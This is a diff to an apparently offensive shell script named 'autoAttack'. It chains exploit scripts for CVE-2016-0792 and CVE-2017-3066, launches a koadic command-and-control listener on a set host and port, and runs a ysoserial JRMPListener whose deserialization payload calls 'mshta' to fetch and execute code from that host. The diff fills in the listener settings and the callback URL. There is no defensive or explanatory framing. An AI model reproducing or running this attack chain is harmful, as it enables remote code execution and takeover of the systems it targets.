@@ -1,4 +1,5 @@
 set -e
+# $1 
 url="$1"
 curPwd="`pwd`/"
 i="autoAttack"
@@ -23,13 +24,15 @@ py2 "${curPwd}/py/CVE-2016-0792.py" $ipport whoami --proto $httpPro
 
 tmux send -t $j "
 /mytools/koadic/koadic
-
-java -cp ${curPwd}/jars/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'mshta '
+set SRVHOST 192.168.31.147
+set SRVPORT 4445
+run
 " Enter
+
+# java -cp ${curPwd}/jars/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'mshta http://192.168.31.147:4445/E7nnO'
+# " Enter
 
 tmux send -t $i "
-
-java -cp ${curPwd}/jars/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'mshta '
+java -cp ${curPwd}/jars/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'mshta http://192.168.31.147:4445/E7nnO'
 " Enter
 py2 "${curPwd}/py/CVE-2017-3066cf_blazeds_des.py" $target $port $curIp 4445
-
